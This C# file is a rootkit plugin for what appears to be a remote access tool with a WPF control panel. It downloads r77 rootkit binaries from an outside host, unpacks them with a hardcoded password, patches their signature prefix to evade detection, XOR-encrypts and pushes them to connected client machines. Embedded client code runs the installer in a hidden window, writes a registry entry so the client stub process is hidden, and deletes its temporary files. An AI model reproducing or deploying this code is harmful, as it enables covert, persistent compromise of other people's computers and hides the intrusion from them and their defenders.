#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class RootkitPlugin : IServerPlugin
    {
        private PluginHost _host;
        private string _r77Dir;
        private string _installExePath;
        private string _uninstallExePath;
        private string _stagerExePath;
        private string _r77x64Path;
        private string _r77x86Path;
        private string _service64Path;
        private string _service32Path;
        private readonly ConcurrentDictionary<string, RootkitUI> _clientUIs = new();

        public string PluginId => "rootkit";
        public string DisplayName => "$tp Rootkit";
        public string Version => "1.0.0";
        public string Description => "Custom ring 3 rootkit — hides processes, files, registry, and network connections";

        internal string Prefix { get; set; } = "$tp";
        private byte[] _prefixAscii;
        private byte[] _prefixUtf16;
        private static readonly byte[] _oldPrefixAscii = { 0x24, 0x37, 0x37 }; // "$77"
        private static readonly byte[] _oldPrefixUtf16 = { 0x24, 0x00, 0x37, 0x00, 0x37, 0x00 }; // "$77" UTF-16

        private static readonly Random _rng = new();

        // ==================== Binary Prefix Patching ====================

        internal byte[] PatchPrefix(byte[] binary)
        {
            if (_prefixAscii == null || _prefixUtf16 == null)
                InitPrefixBytes();

            // Patch ASCII occurrences
            for (int i = 0; i <= binary.Length - 3; i++)
            {
                bool match = true;
                for (int j = 0; j < 3; j++)
                    if (binary[i + j] != _oldPrefixAscii[j]) { match = false; break; }
                if (match)
                    for (int j = 0; j < 3; j++)
                        binary[i + j] = _prefixAscii[j];
            }

            // Patch UTF-16 occurrences
            for (int i = 0; i <= binary.Length - 6; i++)
            {
                bool match = true;
                for (int j = 0; j < 6; j++)
                    if (binary[i + j] != _oldPrefixUtf16[j]) { match = false; break; }
                if (match)
                    for (int j = 0; j < 6; j++)
                        binary[i + j] = _prefixUtf16[j];
            }

            return binary;
        }

        private void InitPrefixBytes()
        {
            _prefixAscii = Encoding.ASCII.GetBytes(Prefix);
            if (_prefixAscii.Length != 3)
                throw new InvalidOperationException("Prefix must be exactly 3 characters");
            _prefixUtf16 = Encoding.Unicode.GetBytes(Prefix);
            if (_prefixUtf16.Length != 6)
                throw new InvalidOperationException("Prefix must be exactly 3 ASCII characters");
        }

        // ==================== ZipCrypto (PKWARE traditional) decryption ====================

        private static uint Crc32(uint crc, byte b)
        {
            crc ^= b;
            for (int j = 0; j < 8; j++)
                crc = (crc >> 1) ^ ((crc & 1) * 0xEDB88320);
            return crc;
        }

        private static byte[] ZipCryptoDecrypt(byte[] encrypted, string password, int dataLen)
        {
            uint key0 = 0x12345678, key1 = 0x23456789, key2 = 0x34567890;
            foreach (char c in password)
            {
                byte b = (byte)c;
                key0 = Crc32(key0, b);
                key1 = (key1 + (key0 & 0xFF)) * 0x08088405 + 1;
                key2 = Crc32(key2, (byte)(key1 >> 24));
            }

            byte[] result = new byte[dataLen];
            for (int i = 0; i < dataLen; i++)
            {
                ushort temp = (ushort)(key2 | 2);
                byte dec = (byte)(encrypted[i] ^ (byte)((temp * (temp ^ 1)) >> 8));
                result[i] = dec;
                key0 = Crc32(key0, dec);
                key1 = (key1 + (key0 & 0xFF)) * 0x08088405 + 1;
                key2 = Crc32(key2, (byte)(key1 >> 24));
            }
            return result;
        }

        internal static byte[] ExtractZipEntry(byte[] zipBytes, string targetName, string password)
        {
            int pos = 0;
            while (pos + 30 <= zipBytes.Length)
            {
                if (zipBytes[pos] != 0x50 || zipBytes[pos + 1] != 0x4B ||
                    zipBytes[pos + 2] != 0x03 || zipBytes[pos + 3] != 0x04)
                { pos++; continue; }

                ushort flags = (ushort)(zipBytes[pos + 6] | (zipBytes[pos + 7] << 8));
                ushort method = (ushort)(zipBytes[pos + 8] | (zipBytes[pos + 9] << 8));
                int compressedSize = (zipBytes[pos + 18] | (zipBytes[pos + 19] << 8) | (zipBytes[pos + 20] << 16) | (zipBytes[pos + 21] << 24));
                ushort nameLen = (ushort)(zipBytes[pos + 26] | (zipBytes[pos + 27] << 8));
                ushort extraLen = (ushort)(zipBytes[pos + 28] | (zipBytes[pos + 29] << 8));

                int dataOff = pos + 30 + nameLen + extraLen;
                string name = Encoding.UTF8.GetString(zipBytes, pos + 30, nameLen);

                bool isEncrypted = (flags & 1) != 0;
                bool hasDataDesc = (flags & 8) != 0;

                string normalized = name.Replace('\\', '/');
                if (normalized.Equals(targetName.Replace('\\', '/'), StringComparison.OrdinalIgnoreCase))
                {
                    byte[] raw;
                    if (compressedSize > 0)
                    {
                        raw = new byte[compressedSize];
                        Buffer.BlockCopy(zipBytes, dataOff, raw, 0, compressedSize);
                    }
                    else
                    {
                        int end = zipBytes.Length;
                        for (int i = dataOff + 1; i < zipBytes.Length - 3; i++)
                        {
                            if (zipBytes[i] == 0x50 && zipBytes[i + 1] == 0x4B && (zipBytes[i + 2] == 0x03 || zipBytes[i + 2] == 0x01))
                            { end = i; break; }
                        }
                        raw = new byte[end - dataOff];
                        Buffer.BlockCopy(zipBytes, dataOff, raw, 0, raw.Length);
                    }

                    if (isEncrypted)
                    {
                        if (string.IsNullOrEmpty(password)) return null;
                        int payloadLen = raw.Length - 12;
                        if (payloadLen <= 0) return null;
                        byte[] decrypted = ZipCryptoDecrypt(raw, password, raw.Length);
                        raw = new byte[payloadLen];
                        Buffer.BlockCopy(decrypted, 12, raw, 0, payloadLen);
                    }

                    if (method == 0)
                        return raw;
                    if (method == 8)
                    {
                        using var ms = new MemoryStream(raw);
                        using var ds = new DeflateStream(ms, CompressionMode.Decompress);
                        using var outMs = new MemoryStream();
                        ds.CopyTo(outMs);
                        return outMs.ToArray();
                    }
                    return raw;
                }

                if (compressedSize > 0 && !hasDataDesc)
                    pos = dataOff + compressedSize;
                else
                    pos = dataOff + 1;
            }
            return null;
        }

        // ==================== Download, Patch & Extraction ====================

        internal async Task<bool> EnsureR77Downloaded()
        {
            if (File.Exists(_installExePath) && File.Exists(_uninstallExePath))
                return true;

            try
            {
                Directory.CreateDirectory(_r77Dir);
                InitPrefixBytes();

                string zipUrl = "https://downloads.bytecode77.com/r77Rootkit%201.8.1.zip";
                string zipPath = Path.Combine(_r77Dir, "r77.zip");

                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(60) })
                {
                    var resp = await client.GetAsync(zipUrl);
                    resp.EnsureSuccessStatusCode();
                    byte[] zipBytes = await resp.Content.ReadAsByteArrayAsync();

                    // Extract and patch each binary
                    SavePatched(zipBytes, "Install.exe", _installExePath);
                    SavePatched(zipBytes, "Uninstall.exe", _uninstallExePath);
                    SavePatched(zipBytes, "Stager.exe", _stagerExePath);
                    SavePatched(zipBytes, "r77-x64.dll", _r77x64Path);
                    SavePatched(zipBytes, "r77-x86.dll", _r77x86Path);
                    SavePatched(zipBytes, "Service64.dll", _service64Path);
                    SavePatched(zipBytes, "Service32.dll", _service32Path);

                    try { File.Delete(zipPath); } catch { }
                }

                return File.Exists(_installExePath);
            }
            catch
            {
                return File.Exists(_installExePath);
            }
        }

        private void SavePatched(byte[] zipBytes, string entryName, string destPath)
        {
            byte[] raw = ExtractZipEntry(zipBytes, entryName, "bytecode77");
            if (raw != null)
            {
                PatchPrefix(raw);
                File.WriteAllBytes(destPath, raw);
            }
        }

        // ==================== IServerPlugin Implementation ====================

        public Task Initialize(PluginHost host)
        {
            _host = host;
            _r77Dir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "r77");
            _installExePath = Path.Combine(_r77Dir, "Install.exe");
            _uninstallExePath = Path.Combine(_r77Dir, "Uninstall.exe");
            _stagerExePath = Path.Combine(_r77Dir, "Stager.exe");
            _r77x64Path = Path.Combine(_r77Dir, "r77-x64.dll");
            _r77x86Path = Path.Combine(_r77Dir, "r77-x86.dll");
            _service64Path = Path.Combine(_r77Dir, "Service64.dll");
            _service32Path = Path.Combine(_r77Dir, "Service32.dll");
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_rootkit
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private string _installExePath;
        private string _uninstallExePath;

        MemoryStream _chunkStream;
        int _chunkExpectedLen;
        int _chunkMode;
        const int MODE_INSTALL = 1;
        const int MODE_UNINSTALL = 2;

        async Task Log(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(""[R] "" + msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                await _send(m);
            }
            catch { }
        }

        async Task SendAck(byte subCmd, string msg)
        {
            try
            {
                byte[] mb = Encoding.UTF8.GetBytes(msg);
                byte[] packet = new byte[mb.Length + 2];
                packet[0] = 0xFE;
                packet[1] = subCmd;
                Buffer.BlockCopy(mb, 0, packet, 2, mb.Length);
                await _send(packet);
            }
            catch { }
        }

        async Task SendErr(string msg)
        {
            try
            {
                byte[] mb = Encoding.UTF8.GetBytes(msg);
                byte[] packet = new byte[mb.Length + 1];
                packet[0] = 0xFF;
                Buffer.BlockCopy(mb, 0, packet, 1, mb.Length);
                await _send(packet);
            }
            catch { }
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();
            await Log(""$tp Rootkit plugin ready"");
            await SendAck(0x01, ""Ready"");

            while (!_cts.IsCancellationRequested)
            {
                byte[] data = null;
                bool fail = false;
                try { data = await receiveData(); }
                catch { fail = true; }
                if (fail || data == null || data.Length == 0) break;

                try { await HandleCmd(data); }
                catch (Exception ex) { Log(""Error: "" + ex.Message).Wait(1000); }
            }

            Cleanup();
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];
            switch (cmd)
            {
                case 0x10:
                    if (data.Length > 5)
                    {
                        _chunkExpectedLen = data[1] | (data[2] << 8) | (data[3] << 16) | (data[4] << 24);
                        _chunkMode = MODE_INSTALL;
                        if (_chunkStream != null) _chunkStream.Dispose();
                        _chunkStream = new MemoryStream(_chunkExpectedLen);
                        _chunkStream.Write(data, 5, data.Length - 5);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                            await FinalizeAndInstall();
                    }
                    break;

                case 0x12:
                    if (data.Length > 5)
                    {
                        _chunkExpectedLen = data[1] | (data[2] << 8) | (data[3] << 16) | (data[4] << 24);
                        _chunkMode = MODE_UNINSTALL;
                        if (_chunkStream != null) _chunkStream.Dispose();
                        _chunkStream = new MemoryStream(_chunkExpectedLen);
                        _chunkStream.Write(data, 5, data.Length - 5);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                            await FinalizeAndUninstall();
                    }
                    break;

                case 0x22:
                    if (_chunkStream != null && data.Length > 1)
                    {
                        _chunkStream.Write(data, 1, data.Length - 1);
                        if (_chunkStream.Length >= _chunkExpectedLen)
                        {
                            if (_chunkMode == MODE_INSTALL)
                                await FinalizeAndInstall();
                            else if (_chunkMode == MODE_UNINSTALL)
                                await FinalizeAndUninstall();
                        }
                    }
                    break;

                case 0x11:
                    if (data.Length > 1)
                    {
                        string processName = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        await ConfigureRootkit(processName);
                    }
                    break;
            }
        }

        async Task FinalizeAndInstall()
        {
            byte[] assembled = _chunkStream.ToArray();
            _chunkStream.Dispose();
            _chunkStream = null;

            byte key = assembled[0];
            byte[] decrypted = new byte[assembled.Length - 1];
            for (int i = 0; i < decrypted.Length; i++)
                decrypted[i] = (byte)(assembled[i + 1] ^ key);

            string tempDir = Path.Combine(Path.GetTempPath(), ""r77_"" + Guid.NewGuid().ToString(""N"").Substring(0, 8));
            Directory.CreateDirectory(tempDir);
            _installExePath = Path.Combine(tempDir, ""Install.exe"");
            File.WriteAllBytes(_installExePath, decrypted);

            await Log(""Install.exe written ("" + decrypted.Length + "" bytes), checking privileges..."");
            await SendAck(0x10, ""Binary written, installing..."");
            await Task.Delay(300);

            bool isAdmin = false;
            try { isAdmin = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); } catch { }
            if (!isAdmin)
            {
                await SendErr(""Admin privileges required — run stub as Administrator"");
                return;
            }

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = _installExePath,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var proc = Process.Start(psi);
                if (proc != null)
                {
                    proc.WaitForExit(60000);
                    await Log(""Install.exe exited with code "" + proc.ExitCode);
                    await SendAck(0x10, ""Install complete (code "" + proc.ExitCode + "")"");
                }
                else
                {
                    await SendErr(""Failed to start Install.exe"");
                }
            }
            catch (Exception ex)
            {
                SendErr(""Install failed: "" + ex.Message).Wait(1000);
            }
        }

        async Task FinalizeAndUninstall()
        {
            byte[] assembled = _chunkStream.ToArray();
            _chunkStream.Dispose();
            _chunkStream = null;

            byte key = assembled[0];
            byte[] decrypted = new byte[assembled.Length - 1];
            for (int i = 0; i < decrypted.Length; i++)
                decrypted[i] = (byte)(assembled[i + 1] ^ key);

            string tempDir = Path.Combine(Path.GetTempPath(), ""r77u_"" + Guid.NewGuid().ToString(""N"").Substring(0, 8));
            Directory.CreateDirectory(tempDir);
            _uninstallExePath = Path.Combine(tempDir, ""Uninstall.exe"");
            File.WriteAllBytes(_uninstallExePath, decrypted);

            await Log(""Uninstall.exe written ("" + decrypted.Length + "" bytes), executing..."");
            await SendAck(0x12, ""Binary written, uninstalling..."");
            await Task.Delay(300);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = _uninstallExePath,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var proc = Process.Start(psi);
                if (proc != null)
                {
                    proc.WaitForExit(60000);
                    await Log(""Uninstall.exe exited with code "" + proc.ExitCode);
                    await SendAck(0x12, ""Uninstall complete (code "" + proc.ExitCode + "")"");
                }
                else
                {
                    await SendErr(""Failed to start Uninstall.exe"");
                }
            }
            catch (Exception ex)
            {
                SendErr(""Uninstall failed: "" + ex.Message).Wait(1000);
            }
        }

        async Task ConfigureRootkit(string processName)
        {
            bool isAdmin = false;
            try { isAdmin = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); } catch { }
            if (!isAdmin)
            {
                await SendErr(""Cannot configure rootkit — run stub as Administrator"");
                return;
            }

            try
            {
                if (processName == ""self"")
                {
                    processName = Process.GetCurrentProcess().ProcessName;
                    await Log(""Auto-detected self process: "" + processName);
                }
                string valueName = ""hidden_"" + Guid.NewGuid().ToString(""N"").Substring(0, 8);
                string args = ""add \""HKLM\\SOFTWARE\\$tpconfig\\process_names\"" /v \"""" + valueName + ""\"" /t REG_SZ /d \"""" + processName + ""\"" /f"";
                var psi = new ProcessStartInfo
                {
                    FileName = ""reg.exe"",
                    Arguments = args,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var proc = Process.Start(psi);
                if (proc != null)
                {
                    proc.WaitForExit(10000);
                    if (proc.ExitCode == 0)
                    {
                        await Log(""Configured rootkit to hide: "" + processName);
                        await SendAck(0x11, ""Configured: "" + processName);
                    }
                    else
                    {
                        await SendErr(""Registry config failed (code "" + proc.ExitCode + "")"");
                    }
                }
                else
                {
                    await SendErr(""Failed to start reg.exe"");
                }
            }
            catch (Exception ex)
            {
                SendErr(""Registry config failed: "" + ex.Message).Wait(1000);
            }
        }

        void Cleanup()
        {
            try
            {
                if (_installExePath != null)
                {
                    string dir = Path.GetDirectoryName(_installExePath);
                    if (dir != null && Directory.Exists(dir))
                        Directory.Delete(dir, true);
                }
            }
            catch { }
            try
            {
                if (_uninstallExePath != null)
                {
                    string dir = Path.GetDirectoryName(_uninstallExePath);
                    if (dir != null && Directory.Exists(dir))
                        Directory.Delete(dir, true);
                }
            }
            catch { }
            _installExePath = null;
            _uninstallExePath = null;
        }
    }
}
";
        }

        // ==================== Deploy Helpers ====================

        internal static byte[] XorEncrypt(byte[] data)
        {
            byte key = (byte)_rng.Next(1, 256);
            byte[] result = new byte[data.Length + 1];
            result[0] = key;
            for (int i = 0; i < data.Length; i++)
                result[i + 1] = (byte)(data[i] ^ key);
            return result;
        }

        internal async Task SendChunked(PluginContext context, byte cmd, byte[] data)
        {
            const int CHUNK_SIZE = 32768;
            int remaining = data.Length;
            int sent = 0;
            bool first = true;
            while (remaining > 0)
            {
                int chunkLen = Math.Min(remaining, CHUNK_SIZE);
                byte[] packet;
                if (first)
                {
                    packet = new byte[5 + chunkLen];
                    packet[0] = cmd;
                    packet[1] = (byte)(data.Length & 0xFF);
                    packet[2] = (byte)((data.Length >> 8) & 0xFF);
                    packet[3] = (byte)((data.Length >> 16) & 0xFF);
                    packet[4] = (byte)((data.Length >> 24) & 0xFF);
                    Buffer.BlockCopy(data, sent, packet, 5, chunkLen);
                    first = false;
                }
                else
                {
                    packet = new byte[1 + chunkLen];
                    packet[0] = 0x22;
                    Buffer.BlockCopy(data, sent, packet, 1, chunkLen);
                }
                await context.SendToClient(packet);
                sent += chunkLen;
                remaining -= chunkLen;
                if (remaining > 0) await Task.Delay(3);
            }
        }

        internal async Task<bool> DeployAndInstallForClient(string clientId, string processName)
        {
            var context = await _host.StartPluginForClient(clientId, PluginId);
            if (context == null) return false;

            if (!await EnsureR77Downloaded()) return false;

            byte[] installBinary = XorEncrypt(File.ReadAllBytes(_installExePath));
            await SendChunked(context, 0x10, installBinary);

            byte[] cfgData = new byte[1 + Encoding.UTF8.GetByteCount(processName)];
            cfgData[0] = 0x11;
            Encoding.UTF8.GetBytes(processName, 0, processName.Length, cfgData, 1);
            await context.SendToClient(cfgData);

            return true;
        }

        internal async Task<bool> UninstallForClient(string clientId)
        {
            var context = await _host.StartPluginForClient(clientId, PluginId);
            if (context == null) return false;

            if (!await EnsureR77Downloaded()) return false;

            if (!File.Exists(_uninstallExePath))
            {
                throw new InvalidOperationException("Uninstall.exe not found. Ensure r77 files are present.");
            }

            byte[] uninstallBinary = XorEncrypt(File.ReadAllBytes(_uninstallExePath));
            await SendChunked(context, 0x12, uninstallBinary);

            return true;
        }

        // ==================== UI ====================

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new RootkitUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        internal string R77Dir => _r77Dir;
        internal string InstallExePath => _installExePath;
        internal string StagerExePath => _stagerExePath;
        internal string R77x64Path => _r77x64Path;
        internal string PrefixInfo => Prefix;
    }

    // ==================== UI ====================

    [SupportedOSPlatform("windows")]
    public class RootkitUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private readonly PluginContext _context;
        private readonly PluginHost _host;
        private readonly RootkitPlugin _plugin;

        Color BgCol => C("BackgroundColor");
        Color SurfCol => C("SurfaceColor");
        Color BrdCol => C("BorderColor");
        Color TxtCol => C("TextPrimaryColor");
        Color DimCol => C("TextSecondaryColor");
        Color DanCol => C("DangerColor");
        Color DanHov => C("DangerHoverColor");
        Color OkCol => C("SuccessColor");
        Color OkHov => C("SuccessHoverColor");
        Color AccCol => C("PrimaryColor");
        Color AccHov => C("PrimaryHoverColor");

        SolidColorBrush BgB => B("BackgroundBrush");
        SolidColorBrush SfB => B("SurfaceBrush");
        SolidColorBrush TxB => B("TextPrimaryBrush");
        SolidColorBrush DmB => B("TextSecondaryBrush");
        SolidColorBrush BdB => B("BorderBrush");

        private readonly TextBox _logBox;
        private readonly Button _installBtn;
        private readonly Button _uninstallBtn;
        private readonly ProgressBar _progress;
        private readonly TextBlock _statusText;

        private bool _disposed;
        private bool _busy;

        public RootkitUI(PluginContext ctx, PluginHost host, RootkitPlugin plugin)
        {
            _context = ctx;
            _host = host;
            _plugin = plugin;

            string prefix = plugin.PrefixInfo;

            var root = new Grid();
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var hdr = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8) };
            hdr.Child = new TextBlock { Text = prefix + " Rootkit — Fileless Process Hiding", FontSize = 14, FontWeight = FontWeights.SemiBold, Foreground = TxB };
            Grid.SetRow(hdr, 0);
            root.Children.Add(hdr);

            var infoBar = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8) };
            infoBar.Child = new TextBlock
            {
                Text = "Auto-detects and hides the client stub process. Install to activate " + prefix + " rootkit.",
                Foreground = DmB, FontSize = 12, TextWrapping = TextWrapping.Wrap
            };
            Grid.SetRow(infoBar, 1);
            root.Children.Add(infoBar);

            var bb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8, 6, 8, 6) };
            var bp = new StackPanel { Orientation = Orientation.Horizontal };
            _installBtn = MakeBtn("Install & Configure", OkCol, OkHov, Brushes.White);
            _installBtn.Click += async (s, e) => await Install();
            _uninstallBtn = MakeBtn("Uninstall", DanCol, DanHov, Brushes.White);
            _uninstallBtn.Click += async (s, e) => await Uninstall();
            _statusText = new TextBlock { Text = "Ready", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 0, 0) };
            bp.Children.Add(_installBtn);
            bp.Children.Add(_uninstallBtn);
            bp.Children.Add(_statusText);
            bb.Child = bp;
            Grid.SetRow(bb, 2);
            root.Children.Add(bb);

            _progress = new ProgressBar { Height = 4, Minimum = 0, Maximum = 100, Value = 0, Visibility = Visibility.Collapsed, Foreground = B("PrimaryBrush") };
            Grid.SetRow(_progress, 3);
            root.Children.Add(_progress);

            var lb = new Border { Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 0) };
            _logBox = new TextBox
            {
                Background = BgB, Foreground = new SolidColorBrush(Color.FromRgb(100, 220, 100)),
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"),
                FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null
            };
            lb.Child = _logBox;
            Grid.SetRow(lb, 4);
            root.Children.Add(lb);

            Content = root;
            Background = BgB;
        }

        Button MakeBtn(string text, Color bg, Color hv, SolidColorBrush fg)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1)); bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4)); bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = text, Template = tp, Foreground = fg, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        async Task Install()
        {
            if (_busy) return;
            _busy = true;
            _installBtn.IsEnabled = false;
            _statusText.Text = "Installing...";
            _progress.Visibility = Visibility.Visible;
            _progress.Value = 0;

            try
            {
                Log("Downloading and patching rootkit binaries...");
                _progress.Value = 10;
                bool ok = await _plugin.EnsureR77Downloaded();
                if (!ok)
                {
                    Log("Failed to acquire rootkit binaries.");
                    _statusText.Text = "Failed";
                    return;
                }
                Log("Patched binaries ready (" + _plugin.PrefixInfo + " prefix)");
                _progress.Value = 30;

                Log("Deploying rootkit to hide client stub (auto-detected)...");
                Log("Deploying to client...");
                _progress.Value = 50;

                bool deployed = await _plugin.DeployAndInstallForClient(_context.ClientId, "self");
                if (deployed)
                {
                    Log("Installation in progress... Check client logs for status.");
                    _statusText.Text = "Sent";
                    _progress.Value = 100;
                }
                else
                {
                    Log("Deployment failed");
                    _statusText.Text = "Failed";
                }
            }
            catch (Exception ex)
            {
                Log("Error: " + ex.Message);
                _statusText.Text = "Error";
            }
            finally
            {
                _busy = false;
                _installBtn.IsEnabled = true;
                await Task.Delay(1500);
                _progress.Visibility = Visibility.Collapsed;
            }
        }

        async Task Uninstall()
        {
            if (_busy) return;
            _busy = true;
            _uninstallBtn.IsEnabled = false;
            _statusText.Text = "Uninstalling...";
            _progress.Visibility = Visibility.Visible;
            _progress.Value = 20;

            try
            {
                Log("Deploying Uninstall.exe...");
                _progress.Value = 50;
                await _plugin.UninstallForClient(_context.ClientId);
                Log("Uninstall in progress...");
                _statusText.Text = "Sent";
                _progress.Value = 100;
            }
            catch (Exception ex)
            {
                Log("Error: " + ex.Message);
                _statusText.Text = "Error";
            }
            finally
            {
                _busy = false;
                _uninstallBtn.IsEnabled = true;
                await Task.Delay(1500);
                _progress.Visibility = Visibility.Collapsed;
            }
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                try
                {
                    switch (data[0])
                    {
                        case 0xFD: if (data.Length > 1) Log("[C] " + Encoding.UTF8.GetString(data, 1, data.Length - 1)); break;
                        case 0xFE: if (data.Length > 2)
                            {
                                string text = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[OK] " + text);
                                if (text.Contains("Install complete") || text.Contains("Configured"))
                                    _statusText.Text = "Installed";
                                else if (text.Contains("Uninstall complete"))
                                    _statusText.Text = "Uninstalled";
                            }
                            break;
                        case 0xFF: if (data.Length > 1) Log("[ERR] " + Encoding.UTF8.GetString(data, 1, data.Length - 1)); break;
                    }
                }
                catch { }
            });
        }

        void Log(string msg)
        {
            if (_disposed) return;
            if (!Dispatcher.CheckAccess()) { Dispatcher.BeginInvoke(() => LogI(msg)); return; }
            LogI(msg);
        }

        void LogI(string msg)
        {
            if (_disposed) return;
            string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\n";
            _logBox.AppendText(line);
            _logBox.ScrollToEnd();
        }

        public void Dispose() { _disposed = true; }
    }
}
